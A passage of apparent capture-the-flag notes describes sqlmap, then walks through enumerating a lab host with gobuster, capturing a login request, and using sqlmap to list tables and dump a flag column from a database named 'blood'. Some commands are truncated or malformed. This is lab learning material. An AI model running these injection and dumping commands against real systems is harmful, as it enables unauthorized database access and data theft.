that automates the process of detecting and exploiting sql injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying and executing commands on the operating system via out-of-band connections.
to show the basic menu:
sqlmap -h
## issues
- ─$ ssh kali@10.49.146.59                                                    
ssh: connect to host 10.49.146.59 port 22: Connection refused

## write up
- to find any available directory
- └─$ gobuster dir -u http://10.49.138.149/ -w /usr/share/wordlists/dirbuster/d
- go to the url
- login anf capture the post request
- save the request in a text file
- run the command for flag:
- └─$ sqlmap -r sqlmap.txt --current-user
- └─$ sqlmap -r sqlmap.txt -D blood --tables
- └─$ sqlmap -r sqlmap.txt -D blood --columns
- └─$ sqlmap -r sqlmap.txt -D blood -T -c  flag,id --dump-all                  
                                                                  
